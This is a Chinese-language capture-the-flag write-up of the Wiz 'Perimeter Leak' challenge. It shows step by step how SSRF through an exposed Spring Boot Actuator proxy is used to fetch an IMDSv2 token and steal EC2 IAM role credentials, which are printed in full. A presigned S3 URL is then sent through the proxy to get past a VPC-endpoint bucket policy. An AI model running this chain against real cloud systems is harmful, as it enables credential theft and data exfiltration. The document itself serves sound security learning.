# WIZ竞标赛 Perimeter Leak wp-先知社区

> **来源**: https://xz.aliyun.com/news/19058  
> **文章ID**: 19058

---

## Perimeter Leak

题目描述

After weeks of exploits and privilege escalation you've gained access to what you hope is the final server that you can then use to extract out the secret flag from an S3 bucket.

It won't be easy though. The target uses an AWS data perimeter to restrict access to the bucket contents.

Good luck!

You've discovered a Spring Boot Actuator application running on AWS: curl <https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com>{"status":"UP"}

目标是拿到 flag，在 S3 存储桶中，说了是 Spring Boot Actuator，直接访问 https://challenge01.cloud-champions.com/actuator 可以看到泄露了很多信息

在 https://challenge01.cloud-champions.com/actuator/env 下看到个 s3 桶 https://challenge01-470f711.s3.amazonaws.com/

![](images/20250928145924-aa71b60c-9c38-1.png)

在 /actuator/mappings 路由看到了个 proxy 接口

```
curl -u ctf:88sPVWyC2P3p -sS https://challenge01.cloud-champions.com/actuator/mappings | jq .
```

![](file://C:\Users\28698\AppData\Roaming\Typora\typora-user-images\image-20250926193443094.png?lastModify=1758986193)

看接口名字猜测是用来代理请求的，接收一个参数并返回字符串，应该是可以 ssrf，在 env 里也能看到 ec2 关键字，猜测应该可以通过 ssrf 访问元数据地址来获得一些凭证之类的，尝试访问下

```
┌──(root㉿lll)-[~]
└─# curl -u ctf:88sPVWyC2P3p "https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
HTTP error: 401 Unauthorized
```

### SSRF 绕过 IMDSv2 拿到临时凭证

这里我们发现确实是存在 IMDS 的，接口返回 HTTP 401 Unauthorized ，这表明 EC2 实例启动的是 IMDSv2

IMDSv2（**Instance Metadata Service v2**）是 AWS 提供的第二代 EC2 实例元数据服务

* **用途**：让 EC2 内部应用获取实例信息（如主机名、region、IAM 角色凭据等）
* **改进点**：相比 IMDSv1，增加了防 SSRF / 本地窃取的安全机制
* **核心机制**：

1. 先向 http://169.254.169.254/latest/api/token 发 **PUT** 请求，带上头 X-aws-ec2-metadata-token-ttl-seconds。
2. 返回一个 **session token**（有效期可自定义，默认 6 小时）

后续所有对 http://169.254.169.254/latest/meta-data/... 的请求必须带请求头：

3. X-aws-ec2-metadata-token: <token>

* **效果**：阻止单纯的 GET SSRF。攻击者要利用 SSRF 拿到元数据，必须能发 **PUT + header** 请求先取 token，再带 token 请求其他数据。

简单来说 **IMDSv2 是 IMDSv1 的安全加固版，强制使用带 token 的两步交互**，主要目的是降低 SSRF 攻击直接获取 IAM 临时凭据的风险。

所以这里我们要先拿到 token 才能进行后续操作，先拿 token

```
┌──(root㉿lll)-[~]
└─# curl -u ctf:88sPVWyC2P3p -X PUT "https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
AQAEAJGBknLHnY_eiqjG8UOq7iDPmUU80inJYed6vyy0EAHb1gAgjw==
```

看下元数据

```
┌──(root㉿lll)-[~]
└─# curl -u ctf:88sPVWyC2P3p "https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/" -H "X-aws-ec2-metadata-token: AQAEAJGBknLHnY_eiqjG8UOq7iDPmUU80inJYed6vyy0EAHb1gAgjw=="
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hibernation/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
system
```

重点看下 iam/ 和 identity-credentials/ ，这两个通常和凭证有关 ，尝试下获取 IAM role 名称

```
┌──(root㉿lll)-[~]
└─# curl -u ctf:88sPVWyC2P3p "https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" -H "X-aws-ec2-metadata-token: AQAEAJGBknLHnY_eiqjG8UOq7iDPmUU80inJYed6vyy0EAHb1gAgjw=="
challenge01-5592368
```

尝试下获取临时凭证

```
┌──(root㉿lll)-[~]
└─# curl -u ctf:88sPVWyC2P3p "https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368" -H "X-aws-ec2-metadata-token: AQAEAJGBknLHnY_eiqjG8UOq7iDPmUU80inJYed6vyy0EAHb1gAgjw=="
{
  "Code" : "Success",
  "LastUpdated" : "2025-09-26T11:37:33Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIARK7LBOHXDMC54UH4",
  "SecretAccessKey" : "ha0nKDDsAutWqVsOFZh8N8j3sK4jeUNHJqNAbGrj",
  "Token" : "IQoJb3JpZ2luX2VjEAQaCXVzLWVhc3QtMSJGMEQCIHSBFKU9gBy0iAZNxd2U4AE7wg58WD+6Wk+S1SOnWFZrAiBFtl6RxdmvDy9jvY5qsPNvaxxf3d9nVsMGM/IATW3fZCrBBQiN//////////8BEAAaDDA5MjI5Nzg1MTM3NCIMxe7EEJG2MBUb7cDXKpUFPEJM7D0/n+FRBqsNX9V1zt1g+FLUsF0+t80uPXJ/IUySuv1QETS9Z5PV4oriSHWZlbB+vcDeRuyzi+hVamKFytPrYF5QeIBCPxgOoU4tV/JgI+Gee5mPrsH1xncBVFIsvJNvRoNMEP4IsTO2f8OGiLh+AU1IV1zRuAKBUyK6D36U4+cyqR/KgBCqgn6V33oSlDuRIAZPehVXbtLrzcxKThoTnZORYewzbK5HrFL3RsRw8DXXnqCi7m+F4EWTfak7LFeNB+clfbbL7QYRMUtgSPEEIslOUIXbjveRzjtegG8GR7fCRQOOqYjYviO0aBsDZp8p+CqhPjXHkBI4+9rNqTg6mVivYT3H9NHyrpO9rKR0e+0diHsW4gJ9ov/Swf/Lp1W79lPhQACWOvrkNq92MIQ+nz9yokKoGV1iyD4PvisjInOROL31DeZHhC4AlNUpISF67/BfVUORdG2D+UipHPfVym/6vgEeT3TUA8xH/tRkfxoxXVdavpyYRf/dcBWRv8wjWLty7KtrkzIlKsJQc+uqbr8ONKLY5bGMJG/qCWP6y2Xvo+BnE5WoDNwxYV+Vs7e7I+74KTiGpm30nQp5jNYs0No06afmuWmxZ8YqhvBjMVtGonpsUJ5N6TmjdzyVJSfNLrk/xhCPS9LGrnY20edElD1LeKNLeHEf8QX2Aw0k5n2bu2cqm9qR5F7QT67fCXcx/oCQ36yTb5BcnfsH0OxDdeHcixypJaaU6QPus4HSP6/h4APrNzTAc38iMmwO+X8d/gLw95/njpmZx1qhkONbcpJhxbkbq1wf9yqKEkuCKzMZATBNEN3+SF/J0vydKEAqDeFjwMq8sBkocFDni3yTrDlNOSv4rJkGuoQeL07RO6HnvzCb9tnGBjqyAQq8nfltBPkvQTMzFGP4LHbgRZbeMl+3PNpa7BBrO5SF/HWG6UFncdeXqqW8xcztIefLvyqpkadQgiuS+oTsisPKiwO8l0pFB/b10Jk01+LgC8u85EQhG6NhYUKPT2Gb0DjqPCLlGb4u1VMhARccVxUp0BNl5dp/yDw709aadzAvqFkxd1iazFho3hShdAqXqGyIqfij7iY5jXc4xGh4wLGEb3ZEuzGDtNYtW2orB2H6Az4=",
  "Expiration" : "2025-09-26T18:01:45Z"
}
```

配置下身份

```
┌──(root㉿lll)-[~]
└─# cat .aws/credentials
[default]
aws_access_key_id = ASIARK7LBOHXDMC54UH4
aws_secret_access_key = ha0nKDDsAutWqVsOFZh8N8j3sK4jeUNHJqNAbGrj
aws_session_token = IQoJb3JpZ2luX2VjEAQaCXVzLWVhc3QtMSJGMEQCIHSBFKU9gBy0iAZNxd2U4AE7wg58WD+6Wk+S1SOnWFZrAiBFtl6RxdmvDy9jvY5qsPNvaxxf3d9nVsMGM/IATW3fZCrBBQiN//////////8BEAAaDDA5MjI5Nzg1MTM3NCIMxe7EEJG2MBUb7cDXKpUFPEJM7D0/n+FRBqsNX9V1zt1g+FLUsF0+t80uPXJ/IUySuv1QETS9Z5PV4oriSHWZlbB+vcDeRuyzi+hVamKFytPrYF5QeIBCPxgOoU4tV/JgI+Gee5mPrsH1xncBVFIsvJNvRoNMEP4IsTO2f8OGiLh+AU1IV1zRuAKBUyK6D36U4+cyqR/KgBCqgn6V33oSlDuRIAZPehVXbtLrzcxKThoTnZORYewzbK5HrFL3RsRw8DXXnqCi7m+F4EWTfak7LFeNB+clfbbL7QYRMUtgSPEEIslOUIXbjveRzjtegG8GR7fCRQOOqYjYviO0aBsDZp8p+CqhPjXHkBI4+9rNqTg6mVivYT3H9NHyrpO9rKR0e+0diHsW4gJ9ov/Swf/Lp1W79lPhQACWOvrkNq92MIQ+nz9yokKoGV1iyD4PvisjInOROL31DeZHhC4AlNUpISF67/BfVUORdG2D+UipHPfVym/6vgEeT3TUA8xH/tRkfxoxXVdavpyYRf/dcBWRv8wjWLty7KtrkzIlKsJQc+uqbr8ONKLY5bGMJG/qCWP6y2Xvo+BnE5WoDNwxYV+Vs7e7I+74KTiGpm30nQp5jNYs0No06afmuWmxZ8YqhvBjMVtGonpsUJ5N6TmjdzyVJSfNLrk/xhCPS9LGrnY20edElD1LeKNLeHEf8QX2Aw0k5n2bu2cqm9qR5F7QT67fCXcx/oCQ36yTb5BcnfsH0OxDdeHcixypJaaU6QPus4HSP6/h4APrNzTAc38iMmwO+X8d/gLw95/njpmZx1qhkONbcpJhxbkbq1wf9yqKEkuCKzMZATBNEN3+SF/J0vydKEAqDeFjwMq8sBkocFDni3yTrDlNOSv4rJkGuoQeL07RO6HnvzCb9tnGBjqyAQq8nfltBPkvQTMzFGP4LHbgRZbeMl+3PNpa7BBrO5SF/HWG6UFncdeXqqW8xcztIefLvyqpkadQgiuS+oTsisPKiwO8l0pFB/b10Jk01+LgC8u85EQhG6NhYUKPT2Gb0DjqPCLlGb4u1VMhARccVxUp0BNl5dp/yDw709aadzAvqFkxd1iazFho3hShdAqXqGyIqfij7iY5jXc4xGh4wLGEb3ZEuzGDtNYtW2orB2H6Az4=
```

配好了，先看下身份

```
┌──(root㉿lll)-[~]
└─# aws sts get-caller-identity
{
    "UserId": "AROARK7LBOHXDP2J2E3DV:i-0bfc4291dd0acd279",
    "Account": "092297851374",
    "Arn": "arn:aws:sts::092297851374:assumed-role/challenge01-5592368/i-0bfc4291dd0acd279"
}
```

wsl 上回显老是卡，换成 windows 打，尝试下能不能直接递归列出所有 object

```
C:\Users\28698>aws s3 ls s3://challenge01-470f711 --recursive
2025-06-19 01:15:24         29 hello.txt
2025-06-17 06:01:49         51 private/flag.txt
```

但是下载的时候出问题了

```
C:\Users\28698>aws s3 cp s3://challenge01-470f711/private/flag.txt ./
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

这里我用 aws-enumerator 简单看了下能执行的命令，就 STS 和 DynamoDB 各有一个命令能执行成功，STS 那个就是查看当前身份的，看下 DynamoDB 这个

```
E:\1.tools\web\cloud\aws\aws-enumerator>aws-enumerator.exe dump -services DYNAMODB

------------------------------------------------------- DYNAMODB -------------------------------------------------------

DescribeEndpoints


E:\1.tools\web\cloud\aws\aws-enumerator>aws ec2 describe-vpc-endpoints

An error occurred (UnauthorizedOperation) when calling the DescribeVpcEndpoints operation: You are not authorized to perform this operation. User: arn:aws:sts::092297851374:assumed-role/challenge01-5592368/i-0bfc4291dd0acd279 is not authorized to perform: ec2:DescribeVpcEndpoints because no identity-based policy allows the ec2:DescribeVpcEndpoints action
```

没权限访问 EC2 VPC Endpoint ，说是 Identity-based policy 的原因，去看下 challenge01-470f711 的策略

```
C:\Users\28698>aws s3api get-bucket-policy --bucket challenge01-470f711|jq .
{
  "Policy": "{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Principal":"*","Action":"s3:GetObject","Resource":"arn:aws:s3:::challenge01-470f711/private/*","Condition":{"StringNotEquals":{"aws:SourceVpce":"vpce-0dfd8b6aa1642a057"}}}]}"
}

C:\Users\28698>aws s3api get-bucket-policy --bucket challenge01-470f711 --query "Policy" --output text | jq .
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::challenge01-470f711/private/*",
      "Condition": {
        "StringNotEquals": {
          "aws:SourceVpce": "vpce-0dfd8b6aa1642a057"
        }
      }
    }
  ]
}
```

可以发现只有当请求来自指定 VPC Endpoint（vpce-0dfd8b6aa1642a057）时才能访问 /private/ 下的资源

### 预签名绕过 VPC Endpoint 限制

简单说下 VPC Endpoint

定义

* VPC Endpoint 是把 VPC 内流量直接连到 AWS 服务或自定义服务的私有连接，**不经过公网**（不走 Internet Gateway / NAT）。

类型（两类最常见）

* **Gateway Endpoint（网关型）**：用于 S3、DynamoDB。它在路由表中添加条目，把到这些服务的流量导向 endpoint。通常**免费**。
* **Interface Endpoint（接口型）**：基于 ENI（弹性网络接口），为服务在你的子网内创建私有 IP 和私有 DNS（例如访问 Secrets Manager、SQS、EC2 API 等）。按小时/数据计费。

工作原理（简化）

* Gateway：在子网路由表添加目标（目标为 vpce），访问 s3:// 的请求直接转到 VPC Endpoint。
* Interface：在子网中创建 ENI，AWS 服务的域名解析到这个私有 IP，流量经 ENI 发到目标服务。

权限与策略

* 每个 VPC Endpoint 可以绑定 **Endpoint Policy**，用来限制哪个 IAM 身份/子网可以通过该 endpoint 访问哪些资源。
* 资源端（例如 S3 桶）可以在 Bucket Policy 中使用条件 aws:SourceVpce / aws:SourceVpceArn 来允许或拒绝来自特定 vpce 的请求（示例里就是用 aws:SourceVpce）。

安全与常见用法

* 用于把对 S3/DynamoDB 的访问限定在私有网络（常用于合规和安全隔离）。
* 搭配 Endpoint Policy + Resource Policy 可以精细控制访问。
* 显式 Deny 并且带 StringNotEquals aws:SourceVpce 的策略，只有来自指定 vpce 的请求才不会被拒绝。

很显然当前凭证的身份不满足指定的 VPC Endpoint，通过 proxy 接口相当于我们还有台机子的权限，虽然没法通过查看元数据地址等方式得到 proxy 这台机子 VPC Endpoint 值，但也没事，试试就知道了，这里不能直接 ssrf ，因为 proxy 接口并不会把任何 AWS 授权信息（签名/凭证）附带给 S3

这里要用到预签名

预签名（pre-signed URL）就是一种 **临时授权访问链接**。

* **生成方式**：由拥有 S3 权限的用户，用自己真实的 AWS 凭证生成。生成时会在 URL 里加上签名参数（签名算法、Access Key ID、签名值、过期时间等）。
* **作用**：别人拿到这个链接，即使没有 AWS 账号和密钥，也能在限定时间内访问指定的对象（读、写，取决于生成时设置）。
* **原理**：S3 在收到请求时会验证 URL 中的签名是否由合法的 AWS 凭证生成、是否未过期。如果验证通过，就等价于持有者授权了这次请求。

简单来说**预签名 URL（Presigned URL）** 是 Amazon S3 提供的一种“临时授权链接”，让你可以把 S3 上的私有文件，在限定时间内安全地分享给别人，而不需要给对方任何 AWS 账户或权限。

生成预签名，详情见 AWS 官方文档[《使用预签名 URL 共享对象》](https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/ShareObjectPreSignedURL.html)，这里需要注意下预签名 URL 中包含很多特殊字符，必须进行 URL 编码，否则在作为?url= 参数传给 proxy 时会被截断，导致请求错误

```
aws s3 presign s3://challenge01-470f711/private/flag.txt | jq -sRr @uri
```

​

然后去请求就好了

![](file://C:\Users\28698\AppData\Roaming\Typora\typora-user-images\image-20250927230059544.png?lastModify=1758986193)![image-20250927230059544.png](images/img_19058_003.png)

### 总结

第一期难度十分友好，元数据地址泄露的东西还是挺多的而且挺有用的，也学到了几个没见过的绕过方式和一些定义，如 IMDSv2 、VPC Endpoint、预签名等，学到了很多，后面的每一期应该也会打

### 参考

<https://www.yaney.me/2025/07/03/WIZ-2025%E7%AB%9E%E6%A0%87%E8%B5%9B-%E7%AC%AC%E4%B8%80%E6%9C%9F-June/>
